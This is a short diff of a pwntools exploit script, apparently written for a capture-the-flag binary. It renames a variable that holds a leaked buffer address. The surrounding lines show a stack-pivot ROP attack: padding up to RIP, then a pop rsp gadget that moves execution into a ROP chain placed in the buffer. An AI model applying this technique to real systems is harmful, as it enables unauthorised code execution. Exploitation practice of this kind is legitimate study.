@@ -18,8 +18,8 @@ pop_rsi_r15 = 0x401229
 # Grabs leaked address of buffer first
 
 io.recvuntil(b'to: ')
-buffer = int(io.recvline(), 16)
-log.success(f'Buffer Address: {hex(buffer)}')
+buffer_address = int(io.recvline(), 16)
+log.success(f'Buffer Address: {hex(buffer_address)}')
 
 
 # Send ROP chain inside buffer first
@@ -47,7 +47,7 @@ diff = offset - len(payload)
 payload += flat(
 	b'A' * diff,		# Padding up to RIP
 	pop_rsp_r13_r14_r15,	# RIP now points to POP RSP which changes the RSP that is now pointing to 
-	buffer					# the buffer which now executes the ROP chain inside the buffer
+	buffer_address			# the buffer which now executes the ROP chain inside the buffer
 )
 
 io.sendline(payload)
